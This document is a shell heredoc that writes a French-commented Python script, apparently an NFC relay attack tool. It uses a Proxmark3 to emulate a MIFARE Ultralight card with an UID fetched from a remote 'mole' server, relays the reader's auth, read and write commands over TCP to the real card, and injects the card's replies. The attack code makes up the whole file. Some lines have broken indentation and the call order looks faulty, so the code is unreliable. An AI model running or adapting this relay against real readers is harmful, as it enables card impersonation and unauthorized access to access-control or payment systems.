cat << 'EOF' > proxy2.py
import subprocess
import socket
import time
import re

# --- CONFIGURATION ---
PM3_PATH = "./client/proxmark3.exe"
PORT_PM3 = "COM10"
MOLE_IP = "127.0.0.1" 
PORT_NET = 5555

def pm3_exec(cmd):
    return subprocess.run([PM3_PATH, PORT_PM3, "-c", cmd], capture_output=True, text=True).stdout

def start_proxy():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        try:
            s.connect((MOLE_IP, PORT_NET))
        except ConnectionRefusedError:
            print("[!] Erreur : lancez d'abord mole.py (le serveur) !")
            return

        uid = s.recv(1024).decode()
        print(f"[*] UID reçu : {uid}. Préparation du simulateur local...")

        # 1. Configurer l'UID pour l'anticollision matérielle (HARDWARE)
        # Cela gère REQA, WUPA, ANTICOLL, SELECT de façon autonome.
        pm3_exec(f"hf mfu setuid {uid}")
	    print("[*] Début de simulation via uid")
	    pm3_exec(f"hf mfu sim -u {uid}")       
        # Vider l'historique pour ne pas traiter d'anciennes trames
        pm3_exec("hf 14a list -c")
        
        print("[*] Anticollision locale prête. En attente d'AUTH ou READ...")

        try:
            processed_lines = 0 # Pour ne lire que les nouvelles lignes
            while True:
                history = pm3_exec("hf 14a list")
                lines = history.split('\n')
                
                # On ne traite que les nouvelles lignes ajoutées au log
                if len(lines) > processed_lines:
                    for i in range(processed_lines, len(lines)):
                        line = lines[i]
                        
                        # On cherche les trames envoyées par le Rdr (Reader)
                        if "Rdr" in line:
                            # Extraction de la trame Hexa (ex: " 1A  00 ")
                            # On cherche une suite de caractères hexa après "Rdr"
                            match = re.search(r'Rdr\s+\|\s*([0-9A-Fa-f\s]+)', line)
                            if match:
                                cmd_clean = match.group(1).replace(" ", "").lower().strip()
                                
                                # --- FILTRAGE : On ne relaye que ce qui est APRES l'anticollision ---
                                # 1A = Auth, 30 = Read, A2 = Write, 60/61 = Auth Mifare Classic
                                if any(cmd_clean.startswith(prefix) for prefix in ['1a', '30', 'a2']):
                                    print(f"[!] Commande détectée à relayer : {cmd_clean}")
                                    
                                    # Envoi à la vraie carte (via le Mole)
                                    s.sendall(cmd_clean.encode()) 
                                    resp = s.recv(1024).decode()
                                    
                                    if resp and resp != "00":
                                        print(f"[*] Injection de la réponse carte : {resp}")
                                        # On injecte la réponse brute dans le champ RF
                                        pm3_exec(f"hf 14a raw {resp}")
                    
                    processed_lines = len(lines)
                
                time.sleep(0.05) # Cycle rapide pour ne pas rater le timing
        except KeyboardInterrupt:
            print("\n[*] Arrêt du Proxy.")

if __name__ == "__main__":
    start_proxy()
EOF